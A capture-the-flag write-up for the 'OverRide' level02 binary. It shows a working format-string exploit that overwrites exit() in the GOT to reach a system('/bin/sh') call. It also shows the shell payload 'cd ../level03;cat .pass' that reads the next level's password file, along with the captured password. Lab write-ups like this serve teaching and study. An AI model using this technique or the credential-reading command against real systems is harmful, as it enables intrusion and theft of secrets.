# Level 02

Firstly, unlike other programs that had Partial RELRO, this one has no RELRO.
To be short, RELRO is what protects the GOT to be written on.
This gives us a clue: the goal is surely to exploit the GOT.

Secondly, this is a 64 bit executable file.
Even though it doesn't change much for this challenge, it's good to keep it in mind.

The program asks for a username and a password,
then the password is compared to the content of `/home/users/level03/.pass`.
If the password is the same as the content of the `.pass` file, we have a shell.
The problem is that there is no way for us to guess the content of `.pass`.

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: Kwon Eun-Bi
--[ Password: I have no clue
*****************************************
Kwon Eun-Bi does not have access!
```

Another nice thing: in the end, the username is printed as such: `printf(username)`.
Looks like a format string exploit is possible here!

```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                                        
--[ Password: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
*****************************************
0x7fffffffe500 (nil) 0x62 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 0x6262626262626262 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa does not have access!
```

Yes it is! And we see that we start having control over the stack at the 8th variable.
Now what do we do from this? After the `printf()` call, there is an `exit()` call.
The idea here is to overwrite the `exit()` address in the GOT.
We can redirect the code execution directly on the main, no need to struggle with a shellcode.

```gdb
   0x0000000000400a78 <+612>:   mov    rdi,rax
   0x0000000000400a7b <+615>:   mov    eax,0x0
   0x0000000000400a80 <+620>:   call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    edi,0x400d32
   0x0000000000400a8a <+630>:   call   0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:   mov    eax,0x0
   0x0000000000400a94 <+640>:   leave  
   0x0000000000400a95 <+641>:   ret    
```

If we redirect the execution to the `0x400a85` address, the next instuctions will be:
- Put the address of "/bin/sh" into `rdi` (first argument of the functions in 64 bits)
- Call `system()`
- Return

Excatly what we want!
Now with a lot of trial and error, here is the final command:

```bash
./level02 < <(python -c 'print("%c" * 6 + "%2687c" + "%hn" + "/" * 78 + "\x28\x12\x60\x00\x00\x00\x00\x00" + "a" * 3989 + "cd ../level03;cat .pass\n")')
```

Lets decrypt it:
- `"%c * 6` is to pop the first 6 variable of the stack
- `"%2687c"` is to pop the last unusable variable of the stack, and doing so with the padding equal to the value we want to write on the first 2 bytes of the address in the GOT (`0x0a85`)
- `"%hn` to be able to write the 2 bytes we want.
- `"/" * 78` is the padding before being able to put the targetted address
- `"\x28\x12\x60\x00\x00\x00\x00\x00"` is the targetted address
- `"a" * 3989` is to fill the buffer of `read()`
- `"cd ../level03;cat .pass\n"` is for the shell to read once it has taken control over the process.

```bash
level02@OverRide:~$ ./level02 < <(python -c 'print("%c" * 6 + "%2687c" + "%hn" + "/" * 78 + "\x28\x12\x60\x00\x00\x00\x00\x00" + "a" * 3989 + "cd ../level03;cat .pass\n")')
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
(**�
[...]
////////////////////////////////////////////////////////////////////////////// does not have access!
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
